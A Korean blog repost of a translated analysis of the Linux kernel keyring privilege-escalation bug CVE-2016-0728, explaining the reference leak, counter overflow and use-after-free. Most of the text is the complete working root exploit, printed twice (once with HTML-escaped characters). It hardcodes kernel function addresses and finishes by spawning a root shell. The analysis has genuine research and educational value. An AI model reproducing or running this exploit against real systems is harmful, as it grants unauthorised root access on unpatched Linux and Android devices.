# Linux 커널 권한 상승 취약점

출처: https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/

#  Linux 커널 권한 상승 취약점(CVE-2016-0728)

최오리가 쓱 번역을 해 놓았길래 퍼다 날라봅니다. 영어 원문글을 번역한 중국어 번역글을 한국어로 번역했다고 합니다. 번역도 했으니 이걸로 삽질을 시작해 볼거라고 하는데, 독촉을 하러 가봐야겠습니다.

원문글과 중국어 번역글 링크는 아래에 첨부합니다 :)

------

원문) Analysis and Exploitation of a Linux Kernel Vulnerability
(CVE-2016-0728) By Perception Point Research Team

중국어 번역글) [Linux内核提权漏洞的分析和利用 (CVE-2016-0728)](http://www.freebuf.com/vuls/93799.html)

------

![14533725477884](https://bpsecblog.files.wordpress.com/2016/04/14533725477884.jpg?w=740)

보안 연구팀 Perception Point은 리눅스 시스템 커널에서 존재하는 고위험 등급의 로컬 권한 상승 0day 취약점을 발견하였다. CVE 코드는[ CVE-2016-0728 ](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-0728)이다. 현재 66%가 넘는 안드로이드 핸드폰과 1000만 리눅스 PC와 서버들이 이 취약점의 영향을 받는다.

#### Introduction

Perception Point 팀이 리눅스 커널에서의 권한상승 취약점을 발견했다. 이 취약점은 일찍이 2012년부터 존재했지만 Perception Point팀은 근래 들어서야 이 취약점을 찾았다고 발표했다. 또한 현재 이 취약점에 대한 정보를 커널 보안팀에 넘겼고, 이어서 PoC 코드를 발표할 것이라고 한다. 이 취약점은 천만대의 리눅스 개인 PC와 서버 그리고 대략 66%의 안드로이드 디바이스(스마트폰과 태블릿 등)에 영향을 준다고 한다. 비록 Perception Point 팀과 커널보안팀은 현재 이 취약점을 활용한 사례를 발견하지 못했지만 최대한 빨리 보안팀들이 이 취약점에 영향을 받는 디바이스들을 점검하여 패치할 것을 권장한다고 전했다.

이 글에서 우리는 이 취약점의 기술적인 세부 내용에 대해서 소개하고 어떻게 이 취약점을 통해 커널에서 코드를 실행하는 지에 대해 설명할 것이다. 결과적으로 PoC가 성공적으로 실행되면서 로컬 사용자의 권한이 상승되어 root 권한을 얻게 될 것이다.

------

#### The Bug

CVE-2016-0728 이 취약점은 리눅스 커널 패스워드 관리 및 저장 기능을 가지고 있는 keyrings에서 레퍼런스 릭이 일어나면서 발생한다. 일단 우리가 이 취약점에 대해서 본격적으로 알아보기 전에 이 취약점과 관련된 배경 지식들에 대해서 알아보자.

Keyrings은 드라이버를 위해 커널에 있는 보안 데이터, 인증키, 암호화 키 등 여러 데이터를 저장하는 역할을 한다. 시스템 콜 인터페이스인 keyctl시스템 콜(이 외에도 시크릿 키를 처리하는 시스템 콜이 add_key와 request_key 2 개 더 있다. 하지만 그 중에서도 keyctl이 절대적으로 중요하다)을 통해, 사용자 공간에 있는 프로그램들이 대상들을 관리하여 그들 각각의 목적을 달성할 수 있도록 도와준다.

각각의 프로세스는 keyctl(KEYCTL_JOIN_SESSION_KEYRING, 명칭)를 사용하여 현재의 세션에서 keyring을 생성할 수 있다. 그런 다음 keyring에게 이름을 지정할 수 있는 데, NULL을 전달함으로써 이름을 지정하지 않을 수도 있다. Keyring은 같은 이름의 keyring을 참조해 서로 다른 프로세스에서 공유를 할 수 있다. 이미 세션 keyring이 프로세스에 존재 할 경우, ketctl 시스템이 호출되어 새로운 keyring을 사용해 이전 것을 대체한다. 만약 하나의 keyring이 여러 개의 프로세스에서 공유되고 있다면 usage라는 필드에 위치한 오브젝트의 내부 레퍼런스 카운터가 증가한다. 릭은 프로세스가 현재의 세션 keyring을 아주 비슷한 keyring으로 대체할 때 발생한다. 커널 3.18버전의 아래 코드 문단을 보면 코드가 error2 라벨로 점프할 수 있다는 것을 알 수 있다. 이 과정에서 key_put의 호출은 생략되게 되고, find_keyring_by_name으로 인해 증가된 레퍼런스가 릭이 된다.



``` c++
long join_session_keyring(const char *name)
{
 ...
       new = prepare_creds();
 ...
       keyring = find_keyring_by_name(name, false); //find_keyring_by_name increments  keyring-&gt;usage if a keyring was found
       if (PTR_ERR(keyring) == -ENOKEY) {
               /* not found - try and create a new one */
               keyring = keyring_alloc(
                       name, old->uid, old->gid, old,
                       KEY_POS_ALL | KEY_USR_VIEW | KEY_USR_READ | KEY_USR_LINK,
                       KEY_ALLOC_IN_QUOTA, NULL);
               if (IS_ERR(keyring)) {
                       ret = PTR_ERR(keyring);
                       goto error2;
               }
       } else if (IS_ERR(keyring)) {
               ret = PTR_ERR(keyring);
               goto error2;
       } else if (keyring == new->session_keyring) {
               ret = 0;
               goto error2; //&lt;-- The bug is here, skips key_put.
       }
 
       /* we've got a keyring - now install it */
       ret = install_session_keyring_to_cred(new, keyring);
       if (ret &lt; 0)                goto error2;        commit_creds(new);        mutex_unlock(&amp;key_session_mutex);        ret = keyring-&gt;serial;
       key_put(keyring);
okay:
       return ret;
 
error2:
       mutex_unlock(&amp;key_session_mutex);
error:
       abort_creds(new);
       return ret;
}
```

유저 레벨에서 이 취약점을 트리거하는 것은 매우 간단하다. 아래 코드에서 나타나 있다시피 여기에서 100개의 keyring 레퍼런스가 릭이 된 것을 알 수 있다.

``` c++
/* $ gcc leak.c -o leak -lkeyutils -Wall */
/* $ ./leak */
/* $ cat /proc/keys */
 
#include <stddef.h>
#include <stdio.h>
#include <sys/types.h>
#include <keyutils.h>
 
int main(int argc, const char *argv[])
{
    int i = 0;
    key_serial_t serial;
 
    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }
 
    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL) < 0) {
        perror("keyctl");
        return -1;
    }
 
    for (i = 0; i &lt; 100; i++) {
        serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "leaked-keyring");
        if (serial < 0) {
        	perror("keyctl");
            return -1;
        }
    }
 
    return 0;
}
```

아래 그림을 보면 leaked-keyring은 이미 100개의 래퍼런스가 존재하는 것을 알 수 있다.

![leak_example](https://bpsecblog.files.wordpress.com/2016/04/leak_example.png?w=740)

#### Exploiting the Bug

이 취약점 자체로도 직접적으로 메모리 릭을 발생시킬 수 있지만, 이를 활용하면 더욱 위험한 결과를 만들어낼 수 있다. 관련된 코드 플로우를 훑어보던 중, 우리는 저장 대상의 레퍼런스 카운터의 데이터 유형이 atomic_t인것을 발견할 수 있었다. 사실상 int형이라는 것인데, 이는 32와 64비트 아키텍쳐에서도 모두 32비트라는 것을 의미한다. 모든 정수는 이론적으로 오버플로우할 수 있지만 이런 관찰 방법으로 인해 이 취약점을 이용하여 오버플로우를 일으켜 0으로 만들 수 있을 거 같다는 생각이 들었다.

만약 어떤 프로세스에서 커널이 하나의 대상을 0x100000000번 참조하여 커널에게 이 오브젝트가 한번도 참조되지 않은 것처럼 인식하게 한다면 이 오브젝트를 free시킬 수 있을 것이다. 만약 같은 프로세스에서 오브젝트의 다른 정상적인 참조를 커널에서 free된 다음에 다시 참조하게 하면 이미 free되었거나 다시 할당된 메모리 구역을 참조하게 된다. 이러한 방법을 통해 우리는 use-after-free를 일으킬 수 있다. 이미 커널 내에서 메모리가 free된 이후에 다시 사용하는 취약점 사례들이 많다. 이제부터의 과정들은 이미 경험이 있는 취약점 연구원들한테는 익숙한 과정이 될 것이다. 이제 만들 익스플로잇 코드의 대체적인 플로우은 아래와 같다.

> 1. Key 오브젝트에 대한 정상적인 참조를 가지고 있는다.
> 2. 해당 keyring 오브젝트의 usage에서 오버플로우를 일으킨다.
> 3. keyring 오브젝트를 free시킨다.
> 4. 사용자 공간에서 사용자가 컨트롤 가능한 내용을 이미 free된 keyring 오브젝트가 사용한 공간에 새로운 커널 오브젝트를 할당한다.
> 5. 이전의 keyring 오브젝트를 참조하게 하여 코드를 실행시킨다.

첫 번째 단계는 완전히 manpage 밖의 일이며, 두 번째 단계는 앞에서 이미 얘기했다. 후속적인 단계들의 기술적인 부분은 차차 얘기해 보도록하자.

------

#### Reference Counter Overflow

이 과정은 사실 취약점의 연장선일 뿐이다. Usage 필드가 int형인 이유는 32비트나 64비트 운영체제에서의 최대값이 모두 2^32이기 때문이다. Usage를 오버플로우 시키기 위해서 우리는 코드가 2^32만큼 루프를 돌게하여 usage가 0이 되도록할 것이다.

------

#### Keyring Object free

Keyring 오브젝트를 free하는 방법은 여러가지가 있다. 첫 번째로는 하나의 프로세스를 이용하여 keyring usage를 오버플로우시켜 0으로 만드는 것이다. 그러면 Keyring 시스템의 Garbage Collection 알고리즘에 의해서 오브젝트가 free된다. 왜냐하면 keyring 시스템에서 오브젝트를 free시킬 때 usage의 카운터가 0으로 세팅되기 때문이다.

팁을 주자면, 만약 우리가 join_session_keyring함수(join_session_keyring함수는 하나의 세션 keyring을 새로운 세션keyring으로 변환해 주는 역할을 한다)의 prepare_creds도 현재의 세션 keyring을 증가시키고, abort_creds 혹은 commit_creds는 각각 감소하는 것을 볼 수 있다. 문제는 abort_creds는 keyring의 usage와 같이 감소하지 않는다는 것이다. 그러나 조금 뒤에 이것은 RCU 작업 메커니즘을 통해 호출(데이터를 수정할 때 먼저 데이터를 읽은 다음 복제본을 하나 생성하여 이 복제본에 수정을 진행한다. 수정이 완료되면 이전 데이터를 업데이트함으로써 새로운 데이터를 생성한다. 이러한 작업이 바로 RCU이다.)된다. 이는 우리가 모르는 상황에서 오버플로우가 일어날 수 있다는 것을 의미한다. 이 문제를 해결하기 위해서 우리는 모든 join_session_keyring호출한 뒤에 sleep(1)을 추가하였다. Sleep(2^32)는 당연히 불가능하다. 가능한 방법은 divide-and-conquer 알고리즘의 변수를 하나 사용하여 2^32-1번째 호출 때 sleep을 걸어주는 것이다. 이렇게 되면 우리는 영원히 우리가 의도하지 않은 오버플로우를 일으킬 수 없다. 왜냐하면 레퍼런스 카운터의 최대값은 호출이 안되어있을 때 2배 증가할 수 있기 때문이다.

------

#### Allocating and Controlling Kernel Object

우리의 프로세스가 free된 keyring 오브젝트를 가리키고 있다면 우리는 커널 오브젝트를 할당하여 keyring 오브젝트를 덮어쓸 필요가 있다. SLAB 메모리 메커니즘으로 인해 keyring 오브젝트 free가된 이후에 여러 오브젝트의 Keyring 데이터 길이를 분배하는 것이 좀 더 쉬워졌다. 우리는 Linux IPC 서브시스템을 사용하여 전송 데이터의 길이를 0xb8 ~ 0x30로 설정한다. 이 때 keyring 오브젝트의 데이터 길이는 0xb8이 되며 정보 헤더의 데이터 길이는 0x30이 된다.

``` c++
if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
    perror(&quot;msgget&quot;);
    exit(1);
}
for (i = 0; i &lt; 64; i++) {
    if (msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0) == -1) {
        perror(&quot;msgsnd&quot;);
        exit(1);
    }
}
```

이 때 우리는 keyring 오브젝트의 데이터 길이를 0x88 바이트 미만으로 컨트롤 할 수 있게 된다.

------

#### Gaining Kernel Code Execution

keyring 오브젝트 내부의 key_type 구조는 여러 함수 포인터를 포함한다. 그렇기 때문에 이 과정은 비교적 쉽다. Revoke 함수 안에는 흥미로운 함수 포인터가 존재하는 데 keyctl(KEY_REVOKE, key_name)함수를 호출함으로써 사용할 수 있다. 아래는 Linux 커널에서 revoke함수를 호출하는 코드이다.

``` c++
void key_revoke(struct key *key)
{
       . . .
       if (!test_and_set_bit(KEY_FLAG_REVOKED, &amp;key-&gt;flags) &amp;&amp;
           key-&gt;type-&gt;revoke)
               key-&gt;type-&gt;revoke(key);
       . . .
}
```

keyring 오브젝트는 아래와 같은 방식으로 내용을 채운다.

![14533726666354](https://bpsecblog.files.wordpress.com/2016/04/14533726666354.jpg?w=740)

keyring의 uid와 플래그값을 활용하여 끊임없이 keyring 오브젝트를 로드하고 동시에 이 과정에 대해서 테스트를 진행함으로써 key-> type-> revoke 순으로 실행되게 만든다. Key 필드는 보통 함수 포인터가 존재하는 사용자 공간의 구조체를 가리켜 root 권한으로 revoke 함수 포인터를 실행시킨다. 이 부분은 데모코드이다.

``` c++
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
 
struct key_type_s {
    void * [12] padding;
    void * revoke;
} type;
 
_commit_creds commit_creds = 0xffffffff81094250;
_prepare_kernel_cred prepare_kernel_cred = 0xffffffff81094550;
 
void userspace_revoke(void * key) {
    commit_creds(prepare_kernel_cred(0));
}
 
int main(int argc, const char *argv[]) {
    ...
    struct key_type * my_key_type = NULL;
    ...
    my_key_type = malloc(sizeof(*my_key_type));
    my_key_type-&gt;revoke = (void*)userspace_revoke;
    ...
}
```

common_creds와 prepare_kernel_cred 함수의 주소는 정적이기 때문에 리눅스 커널 버전과 안드로이드 디바이스를 확인할 수 있다.

자, 이제 마지막 과정이다.

> execl(“/bin/sh”, NULL);

이 [링크](https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f)에는 64비트 3.18 커널 시스템에서 완전히 활용할 수 있는 풀 익스플로잇 코드가 있다. 아래 결과는 EXP가 인텔 i7-5500 CPU에서 대략 30분 정도 실행 했을 때의 결과 화면이다. (보통 커널 권한 상승 취약점은 시간 문제가 존재하지 않는다.)


![14533726961784](https://bpsecblog.files.wordpress.com/2016/04/14533726961784.jpg?w=740)

------

#### Mitigations & Conclusions

이 취약점은 리눅스 커널 3.8 그리고 이보다 높은 버전들에 영향을 준다. SMEP(모니터링 모드를 통한 실행 보호) & SMAP, SELinux는 안드로이드 디바이스에서 이 취약점을 활용하는 데 어느정도의 어려움을 준다. 이제 우리는 이것들을 어떻게 우회할 지에 대해서 얘기해봐도 좋을 거 같다. 하지만 그전에 제일 중요한 것은 패치이므로 빨리 패치부터 진행하자!

``` c++
&lt;/pre&gt;
&lt;pre class=&quot;prettyprint lang-cpp prettyprinted&quot;&gt;/* https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f */
/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
/* $ ./cve_2016_072 PP_KEY */
 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;keyutils.h&gt;
#include &lt;unistd.h&gt;
#include &lt;time.h&gt;
#include &lt;unistd.h&gt;
 
#include &lt;sys/ipc.h&gt;
#include &lt;sys/msg.h&gt;
 
typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
 
#define STRUCT_LEN (0xb8 - 0x30)
#define COMMIT_CREDS_ADDR (0xffffffff81094250)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)
 
struct key_type {
 char * name;
 size_t datalen;
 void * vet_description;
 void * preparse;
 void * free_preparse;
 void * instantiate;
 void * update;
 void * match_preparse;
 void * match_free;
 void * revoke;
 void * destroy;
};
 
void userspace_revoke(void * key) {
 commit_creds(prepare_kernel_cred(0));
}
 
int main(int argc, const char *argv[]) {
 const char *keyring_name;
 size_t i = 0;
 unsigned long int l = 0x100000000/2;
 key_serial_t serial = -1;
 pid_t pid = -1;
 struct key_type * my_key_type = NULL;
 
struct { long mtype;
 char mtext[STRUCT_LEN];
 } msg = {0x4141414141414141, {0}};
 int msqid;
 
 if (argc != 2) {
 puts(&quot;usage: ./keys &lt;key_name&gt;&quot;);
 return 1;
 }
 
 printf(&quot;uid=%d, euid=%d\n&quot;, getuid(), geteuid());
 commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
 prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;
 
 my_key_type = malloc(sizeof(*my_key_type));
 
 my_key_type-&gt;revoke = (void*)userspace_revoke;
 memset(msg.mtext, 'A', sizeof(msg.mtext));
 
 // key-&gt;uid
 *(int*)(&amp;msg.mtext[56]) = 0x3e8; /* geteuid() */
 //key-&gt;perm
 *(int*)(&amp;msg.mtext[64]) = 0x3f3f3f3f;
 
 //key-&gt;type
 *(unsigned long *)(&amp;msg.mtext[80]) = (unsigned long)my_key_type;
 
 if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
 perror(&quot;msgget&quot;);
 exit(1);
 }
 
 keyring_name = argv[1];
 
 /* Set the new session keyring before we start */
 
 serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
 if (serial &lt; 0) {
 perror(&quot;keyctl&quot;);
 return -1;
 }
 
 if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; 0) {
 perror(&quot;keyctl&quot;);
 return -1;
 }
 
 puts(&quot;Increfing...&quot;);
 for (i = 1; i &lt; 0xfffffffd; i++) {
 if (i == (0xffffffff - l)) {
 l = l/2;
 sleep(5);
 }
 if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; 0) {
 perror(&quot;keyctl&quot;);
 return -1;
 }
 }
 sleep(5);
 /* here we are going to leak the last references to overflow */
 for (i=0; i&lt;5; ++i) {
 if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; 0) {
 perror(&quot;keyctl&quot;);
 return -1;
 }
 }
 
 puts(&quot;finished increfing&quot;);
 puts(&quot;forking...&quot;);
 /* allocate msg struct in the kernel rewriting the freed keyring object */
 for (i=0; i&lt;64; i++) {
 pid = fork();
 if (pid == -1) {
 perror(&quot;fork&quot;);
 return -1;
 }
 
 if (pid == 0) {
 sleep(2);
 if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
 perror(&quot;msgget&quot;);
 exit(1);
 }
 for (i = 0; i &lt; 64; i++) {
 if (msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0) == -1) {
 perror(&quot;msgsnd&quot;);
 exit(1);
 }
 }
 sleep(-1);
 exit(1);
 }
 }
 
 puts(&quot;finished forking&quot;);
 sleep(5);
 
 /* call userspace_revoke from kernel */
 puts(&quot;caling revoke...&quot;);
 if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
 perror(&quot;keyctl_revoke&quot;);
 }
 
 printf(&quot;uid=%d, euid=%d\n&quot;, getuid(), geteuid());
 execl(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, NULL);
 
 return 0;
}&lt;/pre&gt;
&lt;pre&gt;
```



`cve_2016_0728.c`

``` c++
/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
/* $ ./cve_2016_072 PP_KEY */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>
#include <unistd.h>

#include <sys/ipc.h>
#include <sys/msg.h>

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

#define STRUCT_LEN (0xb8 - 0x30)
#define COMMIT_CREDS_ADDR (0xffffffff81094250)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)



struct key_type {
    char * name;
    size_t datalen;
    void * vet_description;
    void * preparse;
    void * free_preparse;
    void * instantiate;
    void * update;
    void * match_preparse;
    void * match_free;
    void * revoke;
    void * destroy;
};

void userspace_revoke(void * key) {
    commit_creds(prepare_kernel_cred(0));
}

int main(int argc, const char *argv[]) {
	const char *keyring_name;
	size_t i = 0;
    unsigned long int l = 0x100000000/2;
	key_serial_t serial = -1;
	pid_t pid = -1;
    struct key_type * my_key_type = NULL;
    
struct { long mtype;
		char mtext[STRUCT_LEN];
	} msg = {0x4141414141414141, {0}};
	int msqid;

	if (argc != 2) {
		puts("usage: ./keys <key_name>");
		return 1;
	}

    printf("uid=%d, euid=%d\n", getuid(), geteuid()); 
    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;
    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;
    
    my_key_type = malloc(sizeof(*my_key_type));

    my_key_type->revoke = (void*)userspace_revoke;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    // key->uid
    *(int*)(&msg.mtext[56]) = 0x3e8; /* geteuid() */
    //key->perm
    *(int*)(&msg.mtext[64]) = 0x3f3f3f3f;

    //key->type
    *(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;

    if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }

    keyring_name = argv[1];

	/* Set the new session keyring before we start */

	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
	if (serial < 0) {
		perror("keyctl");
		return -1;
    }
	
	if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
		perror("keyctl");
		return -1;
	}


	puts("Increfing...");
    for (i = 1; i < 0xfffffffd; i++) {
        if (i == (0xffffffff - l)) {
            l = l/2;
            sleep(5);
        }
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
            perror("keyctl");
            return -1;
        }
    }
    sleep(5);
    /* here we are going to leak the last references to overflow */
    for (i=0; i<5; ++i) {
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
            perror("keyctl");
            return -1;
        }
    }

    puts("finished increfing");
    puts("forking...");
    /* allocate msg struct in the kernel rewriting the freed keyring object */
    for (i=0; i<64; i++) {
        pid = fork();
        if (pid == -1) {
            perror("fork");
            return -1;
        }

        if (pid == 0) {
            sleep(2);
            if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
                perror("msgget");
                exit(1);
            }
            for (i = 0; i < 64; i++) {
                if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
                    perror("msgsnd");
                    exit(1);
                }
            }
            sleep(-1);
            exit(1);
        }
    }
   
    puts("finished forking");
    sleep(5);

    /* call userspace_revoke from kernel */
    puts("caling revoke...");
    if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
        perror("keyctl_revoke");
    }

    printf("uid=%d, euid=%d\n", getuid(), geteuid());
    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}
```

